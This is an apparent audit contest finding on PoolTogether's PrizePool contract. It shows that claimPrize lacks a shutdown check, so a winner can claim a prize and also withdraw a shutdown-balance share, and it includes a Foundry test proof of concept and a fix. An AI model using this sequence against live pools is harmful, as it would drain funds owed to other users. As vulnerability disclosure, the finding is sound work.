Real Ceramic Koala

high

# User's might be able to claim their prizes even after shutdown

## Summary
User's might be able to claim their prizes even after shutdown due to `lastObservationAt` and draw period difference

## Vulnerability Detail
There is no shutdown check kept on the `claimPrize` function. Hence user's can calim their prizes even after the pool has been shutdown if the draw has not been finalized

[link](https://github.com/sherlock-audit/2024-05-pooltogether/blob/1aa1b8c028b659585e4c7a6b9b652fb075f86db3/pt-v5-prize-pool/src/PrizePool.sol#L517-L524)
```solidity
  function claimPrize(
    address _winner,
    uint8 _tier,
    uint32 _prizeIndex,
    address _prizeRecipient,
    uint96 _claimReward,
    address _claimRewardRecipient
  ) external returns (uint256) {
    /// @dev Claims cannot occur after a draw has been finalized (1 period after a draw closes). This prevents
    /// the reserve from changing while the following draw is being awarded.
    uint24 lastAwardedDrawId_ = _lastAwardedDrawId;
    if (isDrawFinalized(lastAwardedDrawId_)) {
      revert ClaimPeriodExpired();
    }
```

The remaining balance after a shutdown is supposed to be allocated to user's based on their (vault prize contribution + twab contribution) via the `withdrawShutdownBalance` and is not supposed to be based on a random number ie. via `claimPrize`

[link](https://github.com/sherlock-audit/2024-05-pooltogether/blob/1aa1b8c028b659585e4c7a6b9b652fb075f86db3/pt-v5-prize-pool/src/PrizePool.sol#L938-L941)
```solidity
  function withdrawShutdownBalance(address _vault, address _recipient) external returns (uint256) {
    if (!isShutdown()) {
      revert PrizePoolNotShutdown();
    }
```

In case the draw period is different from the TWAB's period length, it is not necessary that the shutdown due to the `lastObservationAt` occurs at the end of a draw. In such a case, it will allow user's who are winners of the draw to claim their prizes and also withdraw their share of the `shutdown balance` hence stealing funds from others 

### POC
```diff
diff --git a/pt-v5-prize-pool/test/PrizePool.t.sol b/pt-v5-prize-pool/test/PrizePool.t.sol
index 99fe6b5..5ce7ad6 100644
--- a/pt-v5-prize-pool/test/PrizePool.t.sol
+++ b/pt-v5-prize-pool/test/PrizePool.t.sol
@@ -75,6 +75,7 @@ contract PrizePoolTest is Test {
   uint256 RESERVE_SHARES = 10;
 
   uint24 grandPrizePeriodDraws = 365;
+  uint periodLength;
   uint48 drawPeriodSeconds = 1 days;
   uint24 drawTimeout; // = grandPrizePeriodDraws * drawPeriodSeconds; // 1000 days;
   uint48 firstDrawOpensAt;
@@ -112,27 +113,26 @@ contract PrizePoolTest is Test {
 
   ConstructorParams params;
 
-  function setUp() public {
-    drawTimeout = 30; //grandPrizePeriodDraws;
-    vm.warp(startTimestamp);
+    function setUp() public {
+      // at end drawPeriod == 2 day, and period length in twab = 1 day
 
+    periodLength = 1 days;
+    drawPeriodSeconds = 2 days;
+    
+    // the last draw should be ending at lastObservation timestamp + 1 day
+    startTimestamp = 1000 days;
+    firstDrawOpensAt =  uint48((type(uint32).max / periodLength ) % 2 == 0 ? startTimestamp + 1 days : startTimestamp + 2 days);
+
+    
+
+    drawTimeout = 25854; // to avoid shutdown by drawTimeout when warping
+
+    vm.warp(startTimestamp + 1);
     prizeToken = new ERC20Mintable("PoolTogether POOL token", "POOL");
-    twabController = new TwabController(uint32(drawPeriodSeconds), uint32(startTimestamp - 1 days));
+    twabController = new TwabController(uint32(periodLength), uint32(startTimestamp));
 
-    firstDrawOpensAt = uint48(startTimestamp + 1 days); // set draw start 1 day into future
     initialNumberOfTiers = MINIMUM_NUMBER_OF_TIERS;
 
-    vm.mockCall(
-      address(twabController),
-      abi.encodeCall(twabController.PERIOD_OFFSET, ()),
-      abi.encode(firstDrawOpensAt)
-    );
-    vm.mockCall(
-      address(twabController),
-      abi.encodeCall(twabController.PERIOD_LENGTH, ()),
-      abi.encode(drawPeriodSeconds)
-    );
-
     drawManager = address(this);
     vault = address(this);
     vault2 = address(0x1234);
@@ -142,7 +142,7 @@ contract PrizePoolTest is Test {
       twabController,
       drawManager,
       tierLiquidityUtilizationRate,
-      drawPeriodSeconds,
+      uint48(drawPeriodSeconds),
       firstDrawOpensAt,
       grandPrizePeriodDraws,
       initialNumberOfTiers, // minimum number of tiers
@@ -155,6 +155,51 @@ contract PrizePoolTest is Test {
     prizePool = newPrizePool();
   }
 
+  function testHash_CanClaimPrizeAfterShutdown() public {
+    uint secondLastDrawStart = startTimestamp + (type(uint32).max / periodLength ) * periodLength - 3 days;
+
+    vm.warp(secondLastDrawStart + 1);
+    address user1 = address(100);
+    //address user2 = address(200);
+
+    // mint tokens to the user in twab
+    twabController.mint(user1, 10e18);
+    //twabController.mint(user2, 5e18);
+
+    // contribute prize tokens to the vault
+    prizeToken.mint(address(prizePool),100e18);
+    prizePool.contributePrizeTokens(address(this),100e18);
+
+    // move to the next draw and award this one
+    vm.warp(secondLastDrawStart + drawPeriodSeconds + 1);
+    prizePool.awardDraw(100);
+    uint drawId = prizePool.getOpenDrawId();
+
+    //currently not shutdown. but shutdown will occur in the middle of this draw allowing both prize claiming and the shutdown withdrawal
+    uint shutdownTimestamp = prizePool.shutdownAt();
+    assert(shutdownTimestamp == secondLastDrawStart + drawPeriodSeconds + periodLength);
+
+    vm.warp(shutdownTimestamp);
+
+    // call to store the shutdown data before the prize is claimed
+    prizePool.shutdownBalanceOf(address(this),user1);
+
+    /**
+     * address _winner,
+    uint8 _tier,
+    uint32 _prizeIndex,
+    address _prizeRecipient,
+    uint96 _claimReward,
+    address _claimRewardRecipient
+     */
+    prizePool.claimPrize(user1,1,0,user1,0,address(0));
+
+    // no withdrawing shutdown balance will revert due to the amount being withdrawn earlier via the claimPrize function
+    vm.prank(user1);
+    vm.expectRevert();
+    prizePool.withdrawShutdownBalance(address(this),user1);
+  }
+
   function testConstructor() public {
     assertEq(prizePool.firstDrawOpensAt(), firstDrawOpensAt);
     assertEq(prizePool.drawPeriodSeconds(), drawPeriodSeconds);

```

## Impact
User's can double claim assets when vault shutdowns eventually

## Code Snippet
https://github.com/sherlock-audit/2024-05-pooltogether/blob/1aa1b8c028b659585e4c7a6b9b652fb075f86db3/pt-v5-prize-pool/src/PrizePool.sol#L517-L524

## Tool used
Manual Review

## Recommendation
Add a notShutdown modifier to the claimPrize function